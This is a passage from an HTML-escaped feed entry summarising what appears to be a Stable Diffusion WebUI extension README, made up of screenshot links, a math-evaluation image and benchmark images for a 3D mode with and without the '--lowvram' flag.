src=&#34;https://user-images.githubusercontent.com/14872007/196292481-c77bcf3a-4712-44f5-97b2-d4b2480ca012.png&#34; alt=&#34;Screenshot 2022-10-18 at 01-04-09 Stable Diffusion&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;Math evaluation:&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/14872007/195957601-3c3fecab-5ef2-4a2f-9eba-3bb0c70bd4b8.png&#34; alt=&#34;math-eval&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Benchmarks&lt;/h2&gt; &#xA;&lt;p&gt;3D mode without additional WebUI flags&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/14872007/196294447-7817f138-ec4b-4001-885f-454f8667100d.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;3D mode when WebUI is launched with &#39;--lowvram&#39;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/14872007/196294517-125fbb27-c06d-4c4b-bcbc-7c743103eff6.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;</summary>
  </entry>
</feed>